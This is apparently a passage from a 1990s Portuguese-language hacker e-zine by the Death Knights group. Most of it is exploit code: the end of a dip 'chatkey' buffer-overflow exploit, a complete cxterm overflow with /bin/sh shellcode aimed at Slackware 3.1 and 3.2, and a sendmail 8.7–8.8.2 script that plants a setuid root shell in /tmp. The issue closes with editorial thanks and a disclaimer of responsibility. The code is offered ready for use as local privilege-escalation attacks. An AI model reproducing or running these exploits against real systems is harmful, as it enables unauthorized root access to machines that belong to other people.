+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+u_long esp() { __asm__("movl %esp, %eax"); }
+
+main()
+{
+  u_char buf[1024];
+  u_long addr;
+  int i, f;
+
+  strcpy(buf, "chatkey ");
+  addr = esp() - 192;
+  for (i=8; i<128+16; i+=4)
+    *((u_long *) (buf+i)) = addr;
+  for (i=128+16; i<512; i++)
+    buf[i] = 0x90;
+  for (i=0; i<strlen(shell); i++)
+    buf[512+i] = shell[i];
+  buf[512+i] = '\n';
+
+  if ((f = open("temp.dip", O_WRONLY|O_TRUNC|O_CREAT, 0600)) < 0) {
+    perror("temp.dip");
+    exit(0);
+  }
+  write(f, buf, 512+i);
+  close(f);
+
+  execl(PATH_DIP, "dip", "temp.dip", (char *)0);
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+3) Exploit testado para Slackware ver 3.1 e 3.2 usando buffer overflow
+do cxterm.
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+/*
+ * The Death Knights www.deathknights.com  
+ * by ReNeGaDe - ReNeGaDe@DeathKnights.com
+*/
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+#define CXTERM_PATH "/usr/X11R6/bin/cxterm"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+#define NOP_SIZE 1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc,char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i,OffSet = DEFAULT_OFFSET;
+
+/* use a different offset if you find this program doesn't do the job */
+   if (argc>1) OffSet = atoi(argv[1]);
+
+   buff = malloc(2048);
+   if(!buff)
+   {
+      printf("Buy more RAM!\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE;
+i+=NOP_SIZE) {
+        memcpy (ptr,nop,NOP_SIZE);
+        ptr+=NOP_SIZE;
+   }
+
+   for(i=0;i < strlen(shellcode);i++)
+      *(ptr++) = shellcode[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_sp() + OffSet;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   (void) fprintf(stderr,
+         "This bug is discovered by Ming Zhang
+(mzhang@softcom.net)\n");
+    /* Don't need to set ur DISPLAY to exploit this one, cool huh? */
+    execl(CXTERM_PATH, "cxterm", "-xrm",buff, NULL);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+4) Exploit para p SendMail ver. 8.7-8.8.2
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+#/bin/sh
+#
+#
+#                                   Hi !
+#                This is exploit for sendmail smtpd bug
+#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
+#         This shell script does a root shell in /tmp directory.
+#          If you have any problems with it, drop me a letter.
+#                                Have fun !
+#
+#
+#
+#               The Death Knights www.deathknights.com  
+#               by ReNeGaDe - ReNeGaDe@DeathKnights.com
+#
+#
+echo   'main()                                                '>>leshka.c
+echo   '{                                                     '>>leshka.c
+echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
+echo   '}                                                     '>>leshka.c
+#
+#
+echo   'main()                                                '>>smtpd.c
+echo   '{                                                     '>>smtpd.c
+echo   '  setuid(0); setgid(0);                               '>>smtpd.c
+echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c
+echo   '}                                                     '>>smtpd.c
+#
+#
+cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
+./leshka
+kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]"
+"\n"|head -n 1`
+rm leshka.c leshka smtpd.c /tmp/smtpd
+/tmp/sh
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+      Eh isso ae pessoal aqui se encerra minha materia nessa DeathKnights!
+
+      Se  tiverem interesse  em  tirar  duvidas ou  apresentar  novas
+  ideias, aqui estah o meu email. Mais sem babozeiras hein pessoal vamos
+  ter um bom senso pois nao sou desocupado.
+
+         cya l8er!
+
+     ReNeGaDe               ReNeGaDe@DeathKnights.com
+     `'`'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  12  ]=-
+.----------.
+| Leiam...  \________________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Aqui o que tem nao e' nenhuma informacao referente a hacking nem nada, apenas
+o nosso agradecimento a todos que nos apoiam, e aos e-mails que sao recebidos
+diariamente. Quando a gente faz um zine, como este, e' esperando que os
+leitores gostem, e isto que estamos percebendo pelas mensagens que recebemos,
+e assim sempre faremos um zine cada vez melhor. Eu fiquei surpreso de algum
+tempo pra ca, quando, alem das mensagens chegadas do Brasil, comecaram a
+chegar mensagens de varios paises da America Latina, da Espana e de portugal.
+Como podemos ver, nossos leitores estao world wide ( ;P ), o que nunca
+imaginei quando comecei com essa historia de zine. Nosso site e' bem visitado
+por varias partes do mundo(visto por logs), mas nao pensei que lessem o zine,
+e agora tenho certeza de que leem. Muito obrigado a todos que tem nos dado
+apoio.
+
+Tambem agradeco a todos que mandam materias, mas, nao da pra colocar todas,
+nao e'? E pessoal, por favor, nao mandem mais materias de virus em PASCAL,
+ASM ou MACRO. Viros de macro ja falamos, os outros NAO vamos falar. Se sua
+materia for interessante, ela sera publicada aqui, como ja acontece a alguns
+numeros.
+
+E' so isso mesmo... valeu pela paciencia.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+
+-=[  13  ]=-
+.-----------.
+| FEW WORDS  \_______________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+
+        Quer saber quem sao os nossos membros? De uma olhada em nossa page!
+                                               http://www.DeathKnights.com
+
+        Se voce quiser se tornar um membro, esqueca, ja temos muitos
+        membros.
+
+        Se voce quiser mandar um e-mail dizendo o que achou do zine, dar su-
+        gestoes, reclamar, elogiar, meter o pau, colocar alguma materia, este-
+        ja a vontade.
+
+        Se voce tem um zine BOM *OU* um programa e queira disponibiliza-lo
+        para os outros, mande-nos um e-mail. Voce podera' hospeda-lo em
+        http://www.deathknights.com/SuaEscolha gratuitamente. Hey, nao vem
+        pensando que isso aqui e' GeoCities, Xoom ou Tripod nao, antes iremos
+        avaliar seu pedido.
+
+        AVISO NOVAMENTE:
+
+        O grupo The Death Knights nao visa nenhum fim lucrativo. Qualquer uso
+        das informacoes contidas aqui nao e de nossa responsabilidade. Se voce
+        fizer algo descrito e se der mal, problema seu. Nos ensinamos, mas nao
+        pedimos para usarem o conhecimento adquirido com este zine.
+
+
+        Ate o proximo numero!
+
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                            Criticas? Sugestoes?
+
+
+                           death@DeathKnights.com
